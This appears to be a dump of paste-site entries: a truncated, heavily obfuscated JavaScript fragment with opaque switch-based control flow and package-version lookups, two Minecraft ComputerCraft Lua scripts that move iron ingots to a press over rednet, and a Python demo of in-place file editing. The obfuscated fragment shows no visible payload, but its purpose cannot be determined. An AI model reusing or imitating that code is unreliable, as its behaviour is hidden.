761:case w.ejqc4X>-b(64)?29:b(189):case B(248):if((421==c[J(287)]||B(50))&&w.JfM31z[y](b(27))==b(242)){t+=b(49);break}function s(a){var t,n,s,i,u=-101;for(t=-185,n=c.q,s=b(101),i={[B(249)]:()=>a.length,[B(208)]:()=>(u+=203,n+=B(76),s-=160),[B(179)]:b(11),[b(175)]:X((()=>t+=443),0),c:c[B(92)],[J(331)]:()=>(u+=u+532,t-=217),[b(214)]:X((()=>n+=c[J(288)]),0),[J(245)]:X((()=>u=136),0),[J(263)]:()=>u-=J(358),[J(318)]:b(152),[B(90)]:-c.s,[J(317)]:X((()=>t=c[J(287)]),0),[B(215)]:J(359),aV:X((()=>(u+=c[J(284)],t*=J(88),t-=J(360),n+=i[B(215)],s+=c[B(183)],i[b(98)]=J(157))),0),[b(302)]:X((()=>u=136),0),[b(149)]:X((()=>s-=c.v),0),[J(310)]:(e=void 0)=>(void 0===e&&(e=-402==i[B(180)]),e&&w.l4EupK>-J(148)?""aK"":s+=b(262)),[b(301)]:(a=void 0)=>(void 0===a&&(a=i[J(228)]==-B(253)),a&&105==w.uZMUpB[R(20)+e[b(11)]](J(141))?arguments:s+=i.al==-c[b(219)]?""aO"":J(362)),[B(104)]:c[B(56)],Q:()=>s-=198,[B(91)]:B(-22),[J(206)]:(e=void 0)=>(void 0===e&&(e=i[B(92)]==J(297)),e&&w.lUnzWgm>-B(86)?s:(u*=B(-20),u-=t-J(376))),[b(286)]:()=>(u-=c.o,s+=J(364)),[B(120)]:-475,[J(262)]:()=>(i[J(365)](),i[b(98)]=!0),[J(286)]:(B=void 0)=>(void 0===B&&(B=62==u),B?s-=b(34):arguments),[b(288)]:()=>u+=b(96),[J(288)]:-101,[J(256)]:()=>(u==(t==b(152)?""T"":B(24))||f)<(2==i.t&&l),aW:C(X(((...e)=>(e[J(93)]=1,e[B(258)]=J(242),e[B(258)]>J(364)?e[-b(111)]:e[e[b(289)]-67][b(98)]?171:c.y)),0),B(-21))};u+t+n+s!=J(266)&&w.wY2jWU[R(J(153))+R[T(169)](void 0,b(35))](J(141))==J(115);)switch(u+t+n+s){case w.uZMUpB[R(B(45))+R(21)](b(64))==J(223)?c[B(178)]:b(40):case w.ejqc4X>-b(64)?c.A:null:case w.ttvK9Ri[R(31)](1)==J(188)?634:b(290):var o=(t==c[b(122)]?c:P(-140))[B(67)];i[B(154)]();break;case 119!=w.wY2jWU[R(b(76))+R(b(35))](J(141))?-J(114):152:case 798:i.f(),u*=2,u-=i[J(198)],t+=i[B(91)]==b(9)?-190:-J(132),n-=J(126),s*=J(88),s+=c.B,i[J(175)]=J(157);break;case w.YPY9ez()?i.aW(i):null:case c.C:case w.l4EupK>-46?579:-B(147):case w.ejqc4X>-J(141)?c[b(174)]:b(40):if(36==n&&w.ttvK9Ri[h[b(9)]+R(B(4))](B(-21))==B(80)){i.O(),i[J(252)](),n*=i.t,n-=502,i.Q();break}(i[B(92)]==b(10)?a:P(-B(102))).sort(((B,e)=>L(B,e,x=-38)));for(var f=(n==c.E?P(B(260)):c)[B(67)];i[b(179)]();f++)if((119==u?f:b(40))<=0||(i[B(104)]==B(136)?P(b(298)):a)[f]!==(i[J(200)]==B(-21)?a:P(-B(64)))[(i[J(212)]==J(369)||f)-1]||w.FiIyMs7<=-b(111))for(v=L(i.e==J(86)?f:P(J(368)),i[b(123)],x=J(142)),o=(u==B(7)&&L)(39==s?l:P(J(328)),b(10),x=-i[b(135)]);v<o&&w.wY2jWU[R(J(243))](b(64))==J(115);)if((s==t+c[b(128)]?P(J(370)):a)[i[B(237)]=f]+a[v]+(u==B(7)&&a)[i[b(294)]=o]<i.e)v++;else if((i[b(295)]=a)[f]+(i[J(287)]==B(265)?P(-J(172)):a)[n==J(374)?v:P(-230)]+a[i[B(180)]==-c[b(162)]?n:o]>b(9))o--;else{for((i[B(90)]==b(276)?P(J(375)):k).push([a[f],(i[J(228)]==b(38)||a)[v],a[i.d==b(118)||o]]);v<o&&(i[B(298)]=a)[i[R(22)+R(23)+B(142)](J(212))?v:P(257)]===(i[r[T(B(27))]+R(b(86))+B(142)](b(201))||a)[v+c.c]&&w.ino3tXN[d](J(104))==b(187);)v++;for(;v<o&&a[o]===a[(typeof i[B(90)]==R(B(220))&&o)-i.c]&&w.l4EupK>-B(40);)o--;v++,o--}return k;case B(162):case w.mKSyOT>-J(176)?5:-b(299):u=i.aB,i[b(239)]();break;case w.xyIkK8()?t+375:null:case w.lUnzWgm>-J(194)?b(300):-53:case w.FiIyMs7>-B(80)?199:-b(82):var l=i[J(357)]();u+=u==(t==-c.w?-B(253):i[b(145)])?-134:J(239);break;case w.l4EupK>-b(71)?206:-b(212):s=B(93),u*=B(-20),u+=c[B(140)],t-=363,n+=i[J(323)],i[b(301)]();break;case w.mKSyOT>-b(99)?b(275):b(195):if(i[B(91)]==c.G&&w.ejqc4X>-b(64)){u*=i.t,u-=B(220),t+=B(87),i[J(291)]();break}default:i[b(302)](),i[J(418)]();break;case c[b(150)](u):case w.ejqc4X>-J(141)?460:170:case w.mKSyOT>-J(176)?b(29):-178:case 137:var v=(u==((n==u+c[J(212)]?J(333):b(187))>u?-c[b(149)]:J(124))?c:P(b(303))).b;i[J(331)]();break;case w.ejqc4X>-J(141)?J(302):-B(78):v=(17==t?P(J(381)):c).b,u+=i[b(121)]==J(296)?J(164):c[B(156)],t-=190,n-=c[b(249)],i[J(286)]();break;case w.YPY9ez()?29:B(134):o=c[b(98)],i[B(98)](),t+=i[b(123)]==J(284)?""p"":-b(305),n+=c[J(288)],s+=n-359,i[J(175)]=!0;break;case w.ejqc4X>-b(64)?b(59):-B(275):if((i[J(288)]==-B(59)||J(158))&&w.JfM31z[I[T(B(259))]](B(-4))==J(319)){t+=c[B(223)],n-=b(325);break}i[J(317)](),u+=t+(i.t==-J(87)?B(197):662),n-=J(408),i[B(202)](),i[B(67)]=!0;break;case w.ttvK9Ri[R[T(B(8))](B(9),b(76))+R[T(J(116))](B(9),b(35))](1)==J(188)?b(48):187:case w.ByWrJH>-J(122)?352:-228:case w.xyIkK8()?990:B(103):case 665:var k=[];i.H()}}c.U();break;case a!=J(384)&&a-B(277):case 433:c.a=n,c[B(278)]();break;case 122:P(-J(220)).log(s),c[b(265)]();break;case 1011:case 671:case 463:case B(279):if(typeof c[J(284)]==q[T(B(185))]+""on""){t+=28,a-=5;break}t=-125,t-=B(244),a+=120;break;case B(37):var i=c[J(388)]();if(i===J(369))break;if(typeof i==R(b(77)))return i[B(235)]}},set[b(128)](B){t=B},get[J(190)](){return p},set[b(129)](e){if(B(50)){const e=require(""path""),{version:a}=require(""../../package""),{version:r}=require(""@redacted/enterprise-plugin/package""),{version:c}=require(""@redacted/components/package""),{sdkVersion:t}=require(""@redacted/enterprise-plugin"");require(""../utils/isStandaloneExecutable""),require(""./resolve-local-redacted-path""),e.resolve(P(-896),R(B(14))+R(36)+""js"")}localStorage=e},get[B(97)](){return t},get[J(261)](){return u}},z=[K,j],O(R(37))},[R(b(133))]:C(X(((...e)=>{e[b(16)]=3,e[b(312)]=b(215);var[...a]=s;return e[b(49)]=b(132),e[e[39]-b(124)]={},e[B(281)]>215?e[-19]:(z=[a,e[B(33)]],O(R(e[B(18)]-B(76))))}),0),B(-4))},l==R[T(170)](void 0,[B(265)])&&(s=[]),y=l==R(B(1))?n[o]||=function(...B){return s=B,h[o].call(this,R(39))}:h[o](R(b(65))),d==R(B(79))?{dT4KN3:y}:y}({[T(h(28))]:R(B(-3))}[T(h(28))],R(25),R(B(79))).dT4KN3}catch(e){var y,m,I,j;function h(B){return a[B<-59?B-36:B+58]}for(y=470,m=-b(115),I=B(248),j={[B(75)]:h(-55),[b(129)]:function(e=void 0){void 0===e&&(e=m==y-516);var r=X((B=>a[B<13?B+17:B>13?B<397?B>397?B-57:B-14:B+19:B+37]),1);return e&&w.FiIyMs7>-r(117)?arguments:(y+=B(81),m+=j[r(119)])},[h(55)]:X((()=>(I=b(70),y+=b(197),m+=y+j.d,B(91))),0),[B(83)]:-B(84),[b(150)]:()=>{var B=X((B=>a[B<355?B>-29?B<-29?B+21:B<355?B<-29?B-22:B>355?B-65:B>355?B-17:B+28:B+94:B+21:B-60]),1);return y+=b(25),j[h(32)]=B(44)},d:-1378,[b(116)]:X((()=>y-=h(51)),0),[B(97)]:X((()=>y==-b(49)),0),[b(211)]:function(B=void 0){return void 0===B&&(B=j[h(47)]==-b(115)),B&&w.mKSyOT>-86?arguments:I=h(92)},[b(123)]:R(b(118)),w:-1283,[B(82)]:-51,[h(79)]:C(X(((...e)=>{var r=X((B=>a[B>424?B+32:B>40?B>40?B<424?B<40?B-82:B-41:B+20:B+58:B+31]),1);return e.length=B(-21),e[r(152)]=e[B(-22)],e[h(53)]+508}),0),1),[b(162)]:C(X(((...e)=>(e[B(-15)]=h(-56),e.hT4qaM=e[0],429!=e.hT4qaM&&e.hT4qaM-b(300))),0),b(10))};y+m+I!=b(250);){var J,K;function r(B){return a[B<54?B-55:B<54?B+88:B>54?B>438?B-23:B>54?B<438?B-55:B-17:B+42:B-62]}switch(J=R(h(-31)),K={[T(r(177))]:R[T(169)](void 0,b(76))},y+m+I){case w.D2Q0z4[R(b(33))](r(152))==h(40)?r(167):-206:if(j[B(90)]()==h(56)&&w.D2Q0z4[l](b(105))==b(106))break;case 119!=w.wY2jWU[R(B(45))+R(h(-31))](h(-2))?null:j[b(98)]?B(206):653:(j[b(113)]==b(94)||P(-h(77)))[j[h(57)]](e),y-=r(135);break;case h(58):case w.ejqc4X>-b(64)?195:h(151):case 978:I=typeof j[r(182)]==R(28)?j[r(256)]:b(70),j.A(),m-=B(-9);break;case w.FiIyMs7>-h(45)?I-740:void 0:delete j.r,j.r(),y-=b(76);break;default:I=118,y+=790,m*=j.h,m-=521;break;case w.D2Q0z4[R(B(2))](5)==h(40)?r(172):b(22):case 382:case w.D2Q0z4[R(r(80))](h(39))!=B(75)?-B(95):h(160):P(-h(291))(i),j.p();break;case w.D2Q0z4[R(b(33))](h(39))!=r(153)?-210:r(174):case B(19):u=m==r(115),y+=h(-6),m-=51;break;case w.FiIyMs7>-b(111)?j.F(y):null:case""h""!=w.D2Q0z4[R(r(80))](b(105))?-b(156):322:u=j[b(128)](),j[b(129)]();break;case w.wY2jWU[K[T(b(130))]+J](h(-2))!=b(38)?-r(178):h(-39):case 895:case w.D2Q0z4[q[T(172)]](5)==B(75)?759:-r(179):case w.FiIyMs7>-r(158)?948:b(52):u=h(15),y+=y+(470==y?-334:-B(18))}}}}(),C(P,B(-21)),C(Q,B(-21)),C(T,1);"
nWGkDu29,sender,chesiren,Lua,Tuesday 30th of April 2024 05:38:33 PM CDT,"local p = peripheral
local temp = p.find(""barrel"")
local stockage = p.find(""vault"")

rednet.open(""back"")
local receiverID = 2 
local eventName = ""press""
local parameters = {name = ""minecraft:iron_ingot"", count = 10}
local message = {eventName, parameters}

local cache = {}
local goal = parameters.count
for slot, item in pairs(stockage.list()) do
    --print((""%d x %s in slot %d""):format(item.count, item.name, slot))
    if (item.name == parameters.name) then
        if (item.count >= goal) then
            cache[slot] = goal
            goal = 0
            break
        else
            cache[slot] = item.count
            goal = goal - item.count
        end
    end
end

if (goal > 0) then
    print(""manque de matière pour le craft"")
    return
else
    print(""envoi des materiaux et du craft..."")

    for slot, count in pairs(cache) do
        stockage.pushItems(p.getName(temp), slot, count)
    end
    
    rednet.send(receiverID, message)
end

"
Qc2cDuPf,receiver,chesiren,Lua,Tuesday 30th of April 2024 05:33:09 PM CDT,"local p = peripheral
local temp = p.find(""minecraft:barrel"")
local press = p.find(""create:depot"")
local stockage = p.find(""create:item_vault"")
rednet.open(""back"")

print(press.list())

local function sender(parameters)
    
    local goal = parameters.count
    for slot, item in pairs(temp.list()) do
        if (item.name == parameters.name) then            
            if (item.count >= goal) then
                temp.pushItems(p.getName(press), slot, goal)
                goal = 0
                break
            else
                temp.pushItems(p.getName(press), slot, item.count)
                goal = goal - item.count
            end
        end
    end

    print(""sending to press done"")
end

local function withdrawer(parameters)

    print(""withdrawing pressed items done"")
end

while true do
    local senderID, message, distance = rednet.receive() 
    local eventName = message[1]  
    local parameters = message[2]  

    if eventName == ""press"" then
        print(""Received press event from computer ""..senderID)
        
        parallel.waitForAll(function() sender(parameters) end, function() withdrawer(parameters) end)
    end
end"
QH4KXPQT,inplace_editing_example,Python253,Python,Tuesday 30th of April 2024 05:18:43 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: inplace_editing_example.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
This script demonstrates in-place editing of a text file in Python.

Requirements:
- Python 3.x

Usage:
1. Run the script.
2. The script will create a sample text file called 'sample.txt' with initial content.
3. It will open 'sample.txt' in the default text editor.
4. Press [ENTER] to continue.
5. The script will perform in-place editing by replacing placeholders with new values.
6. It will then open the edited file again in the default text editor.
7. The script will provide verbose output messages at each step of the process.

""""""

import subprocess
import sys
import os

def open_in_editor(filename):
    """"""
    Opens the specified file in the default text editor based on the platform.

    Args:
        filename (str): The name of the file to be opened.

    Returns:
        None
    """"""
    if sys.platform.startswith('win'):  # Windows
        os.system(f'start notepad {filename}')
    elif sys.platform.startswith('darwin'):  # macOS
        subprocess.call(['open', filename])
    elif os.name == 'posix':  # Linux/Unix
        subprocess.call(['xdg-open', filename])

# Create a sample text file
print(""Creating sample.txt...\n"")
with open('sample.txt', 'w') as file:
    file.write(""The sample text is #text# and the\nnumber is #num#."")

# Open sample.txt in default text editor
print(""\nOpening sample.txt in default text editor...\n"")
open_in_editor('sample.txt')

# Wait for user to hit enter
input(""\nPress Enter to continue...\n"")

# Define replacements
replacements = {
    '#text#': '""Hello World""',
    '#num#': '42'
}

# Perform in-place editing
print(""\nPerforming in-place editing...\n"")
with open('sample.txt', 'r+') as file:
    content = file.read()
    for old, new in replacements.items():
        content = content.replace(old, new)
    file.seek(0)
    file.write(content)
    file.truncate()

# Open edited sample.txt in default text editor
print(""\nOpening edited sample.txt in default text editor...\n"")
open_in_editor('sample.txt')

# Exiting program
print(""\nAll Processes Have Finished Successfully!\n\n\nExiting Program...\tGoodbye!\n"")

"
